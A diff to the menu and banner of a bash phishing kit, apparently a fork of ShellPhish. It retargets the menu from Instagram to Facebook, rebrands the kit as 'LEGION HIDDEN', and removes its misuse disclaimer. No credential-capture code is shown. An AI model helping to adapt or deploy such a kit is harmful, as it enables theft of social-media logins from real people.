@@ -19,7 +19,7 @@ command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not inst
 
 menu() {
 
-printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m\e[1;93m Instagram\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m\e[1;93m Facebook\e[0m\n"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option
 
 
@@ -51,17 +51,12 @@ fi
 
 banner() {
 
-printf "\e[1;77m     _     _             _  _  ______   _      _        _      \e[0m\n"
-printf "\e[1;77m    | |   | |           | || |(_____ \ | |    (_)      | |     \e[0m\n"
-printf "\e[1;77m     \ \  | | _    ____ | || | _____) )| | _   _   ___ | | _   \e[0m\n"
-printf "\e[1;77m      \ \ | || \  / _  )| || ||  ____/ | || \ | | /___)| || \  \e[0m\n"
-printf "\e[1;77m  _____) )| | | |( (/ / | || || |      | | | || ||___ || | | | \e[0m\n"
-printf "\e[1;77m (______/ |_| |_| \____)|_||_||_|      |_| |_||_|(___/ |_| |_| v1.1\e[0m\n"
+printf "\e[1;77m LEGION HIDDEN v1.1\e[0m\n"
 printf "\n"
-printf "\e[1;93m       .:.:.\e[0m\e[1;77m Phishing Tool coded by: @thelinuxchoice \e[0m\e[1;93m.:.:.\e[0m\n"
+printf "\e[1;93m       .:.:.\e[0m\e[1;77m SOMOS LEGION \e[0m\e[1;93m.:.:.\e[0m\n"
 printf "\n"
-printf "  \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
-printf "  \e[101m\e[1;77m:: responsible for any misuse or damage caused by ShellPhish ::\e[0m\n"
+printf "  \e[101m\e[1;77m:: ANTI CP    ::\e[0m\n"
+printf "  \e[101m\e[1;77m:: . ::\e[0m\n"
 printf "\n"
 }
 
